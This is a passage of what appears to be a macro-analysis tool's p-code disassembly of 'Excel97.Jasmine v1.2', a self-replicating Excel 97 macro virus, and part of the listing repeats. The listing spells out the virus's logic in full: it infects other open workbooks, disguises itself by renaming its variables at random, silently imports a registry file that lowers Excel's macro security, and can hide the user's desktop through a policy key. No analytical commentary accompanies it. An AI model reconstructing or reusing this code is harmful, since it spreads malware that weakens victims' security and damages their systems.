' Line #8:
' 	LitStr 0x000D "c:\remove.reg"
' 	St Eq7Jw1 
' 	BoS 0x0000 
' 	LitStr 0x002D "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	St Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #10:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #11:
' 	ArgsCall Read 0x0000 
' Line #12:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsCall (Call) Encode 0x0001 
' Line #14:
' 	LineCont 0x0004 08 00 03 00
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	MemLd CountOfLines 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	St Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' Line #15:
' 	GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	SetStmt 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Se3Hs8Xo2Ir2Rq4Kc9 
' Line #19:
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd New 
' 	St Wb9 
' Line #20:
' 	SetStmt 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld Wb9 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #22:
' 	LineCont 0x0004 0C 00 04 00
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsCall (Call) Encode 0x0001 
' 	EndIf 
' Line #23:
' 	LineCont 0x0004 0A 00 04 00
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	MemLd CountOfLines 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' Line #24:
' 	GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Next 
' Line #27:
' 	StartForVariable 
' 	Next 
' Line #28:
' 	Label Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #29:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld Yp3Wi1Ex3Iq8Iw1 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #31:
' 	LitVarSpecial (True)
' 	St Yp3Wi1Ex3Iq8Iw1 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St Xc4Rc6Nb1Xh7Uc3Yy9 
' Line #32:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\BOOK1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #36:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #37:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Ne 
' 	IfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	LitDI2 0x0006 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	SetStmt 
' 	Ld ii 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Se3Hs8Xo2Ir2Rq4Kc9 
' Line #43:
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd New 
' 	St Wb9 
' Line #44:
' 	SetStmt 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	Set Infline 
' Line #45:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Infline 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Ne 
' 	IfBlock 
' Line #46:
' 	LitDI2 0x0001 
' 	Ld Wb9 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' 	LitDI2 0x0006 
' 	LitStr 0x001F "Private Sub WorkBook_Activate()"
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	StartForVariable 
' 	Next 
' Line #53:
' 	Ld Xc4Rc6Nb1Xh7Uc3Yy9 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #54:
' 	LitVarSpecial (False)
' 	St Xc4Rc6Nb1Xh7Uc3Yy9 
' Line #55:
' 	LitVarSpecial (True)
' 	ParamNamed savechanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #56:
' 	Ld Eq7Jw1 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #58:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x0013 "9.0\Excel\Security]"
' 	Concat 
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x001A "8.0\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x002C "8.0\New User\Settings\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x001A "8.0\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #70:
' 	LitStr 0x000B "regedit /s "
' 	Ld Eq7Jw1 
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #71:
' 	Ld Eq7Jw1 
' 	ArgsCall Kill 0x0001 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	SelectCase 
' Line #75:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #76:
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #77:
' 	LitDI2 0x0006 
' 	LitDI2 0x000A 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #78:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #79:
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	MemStWith Heading 
' Line #80:
' 	LineCont 0x0004 0B 00 0C 00
' 	LitStr 0x0022 "Since the only time I see her near"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0017 "Is when I close my eyes"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0019 "Should I keep it that way"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0023 "The only way I can make her stay..."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	MemStWith Then 
' Line #81:
' 	LitDI2 0x0016 
' 	MemStWith Animation 
' Line #82:
' 	ArgsMemCallWith Show 0x0000 
' Line #83:
' 	EndWith 
' Line #84:
' 	LitDI2 0x000B 
' 	LitDI2 0x0014 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0258 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ForStep 
' Line #86:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St Yx1Kg4De8Bs6Sm1Jd5Ca0 
' Line #87:
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Concat 
' 	St j 
' Line #88:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #89:
' 	LitStr 0x000F "Excel97.Jasmine"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #90:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #91:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #92:
' 	LitStr 0x0005 "Arial"
' 	MemStWith New 
' Line #93:
' 	LitDI2 0x000A 
' 	MemStWith Size 
' Line #94:
' 	EndWith 
' Line #95:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #96:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #97:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	MemStWith ColorIndex 
' Line #98:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #99:
' 	EndWith 
' Line #100:
' 	LineCont 0x0004 05 00 05 00
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	Concat 
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #101:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #102:
' 	StartForVariable 
' 	Next 
' Line #103:
' 	LitDI2 0x0015 
' 	LitDI2 0x001E 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #104:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0009 "NoDesktop"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #105:
' 	LitDI2 0x001F 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Case 
' 	CaseDone 
' Line #106:
' 	LitStr 0x0000 ""
' 	Ld vbInformation 
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	ArgsCall MsgBox 0x0003 
' Line #107:
' 	EndSelect 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Private Sub Encode(Loc As Object))
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn varray (As String)
' Line #113:
' 	Dim 
' 	VarDefn Do0Nw3Ag1Pz6Yk6 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Sa4Ym1Ho4Wi0 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Bp0Ah5Ak9Jr3Qa5Yo3Ze6 (As Long)
' Line #114:
' 	LitStr 0x0006 "Eq7Jw1"
' 	LitDI2 0x0001 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0018 "Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4"
' 	LitDI2 0x0002 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0018 "Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5"
' 	LitDI2 0x0003 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0012 "Se3Hs8Xo2Ir2Rq4Kc9"
' 	LitDI2 0x0004 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Wb9"
' 	LitDI2 0x0005 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001E "Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9"
' 	LitDI2 0x0006 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000F "Yp3Wi1Ex3Iq8Iw1"
' 	LitDI2 0x0007 
' 	ArgsSt varray 0x0001 
' Line #115:
' 	LitStr 0x0012 "Xc4Rc6Nb1Xh7Uc3Yy9"
' 	LitDI2 0x0008 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Yx1Kg4De8Bs6Sm1Jd5Ca0"
' 	LitDI2 0x0009 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000F "Do0Nw3Ag1Pz6Yk6"
' 	LitDI2 0x000A 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001B "Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1"
' 	LitDI2 0x000B 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000C "Sa4Ym1Ho4Wi0"
' 	LitDI2 0x000C 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Bp0Ah5Ak9Jr3Qa5Yo3Ze6"
' 	LitDI2 0x000D 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Dj4Rb0Vn7Kv8Uz2Yx3Ym1"
' 	LitDI2 0x000E 
' 	ArgsSt varray 0x0001 
' Line #116:
' 	ArgsCall Read 0x0000 
' Line #117:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #118:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #119:
' 	Ld PolyVal 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0030 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyVal 
' Line #120:
' 	StartForVariable 
' 	Next 
' Line #121:
' 	StartWithExpr 
' 	Ld Loc 
' 	With 
' Line #122:
' 	LitDI2 0x0001 
' 	St Do0Nw3Ag1Pz6Yk6 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St Sa4Ym1Ho4Wi0 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' Line #123:
' 	Ld i 
' 	ArgsLd varray 0x0001 
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	Ld Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	Ld Sa4Ym1Ho4Wi0 
' 	Ld Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #124:
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strVal 
' Line #125:
' 	Ld strVal 
' 	Ld Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld PolyVal 
' 	Concat 
' 	Ld strVal 
' 	Ld Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strVal 
' Line #126:
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	Ld strVal 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #127:
' 	Ld Sa4Ym1Ho4Wi0 
' 	LitDI2 0x0001 
' 	Add 
' 	St Do0Nw3Ag1Pz6Yk6 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' Line #128:
' 	MemLdWith CountOfLines 
' 	St Sa4Ym1Ho4Wi0 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' Line #129:
' 	Loop 
' Line #130:
' 	EndWith 
' Line #131:
' 	LitStr 0x0000 ""
' 	St PolyVal 
' Line #132:
' 	StartForVariable 
' 	Next 
' Line #133:
' 	EndSub 
' Line #134:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 10713 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Excel97.Jasmine v1.2"
' Line #1:
' 	QuoteRem 0x0000 0x001B "Copyright (c) 1999, cry0tek"
' Line #2:
' Line #3:
' 	Dim (Public) 
' 	VarDefn Yp3Wi1Ex3Iq8Iw1
' 	VarDefn Xc4Rc6Nb1Xh7Uc3Yy9 (As Boolean)
' Line #4:
' 	QuoteRem 0x0000 0x0007 "Jasmine"
' Line #5:
' 	FuncDefn (Private Sub Workbook_WindowDeactivate(ByVal Wn As ))
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	Dim 
' 	VarDefn Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 (As Object)
' Line #8:
' 	LitStr 0x000D "c:\remove.reg"
' 	St Eq7Jw1 
' 	BoS 0x0000 
' 	LitStr 0x002D "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	St Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #10:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #11:
' 	ArgsCall Read 0x0000 
' Line #12:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsCall (Call) Encode 0x0001 
' Line #14:
' 	LineCont 0x0004 08 00 03 00
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	MemLd CountOfLines 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	St Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' Line #15:
' 	GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	SetStmt 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Se3Hs8Xo2Ir2Rq4Kc9 
' Line #19:
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd New 
' 	St Wb9 
' Line #20:
' 	SetStmt 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld Wb9 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #22:
' 	LineCont 0x0004 0C 00 04 00
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsCall (Call) Encode 0x0001 
' 	EndIf 
' Line #23:
' 	LineCont 0x0004 0A 00 04 00
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	MemLd CountOfLines 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' Line #24:
' 	GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Next 
' Line #27:
' 	StartForVariable 
' 	Next 
' Line #28:
' 	Label Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #29:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld Yp3Wi1Ex3Iq8Iw1 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #31:
' 	LitVarSpecial (True)
' 	St Yp3Wi1Ex3Iq8Iw1 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St Xc4Rc6Nb1Xh7Uc3Yy9 
' Line #32:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\BOOK1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
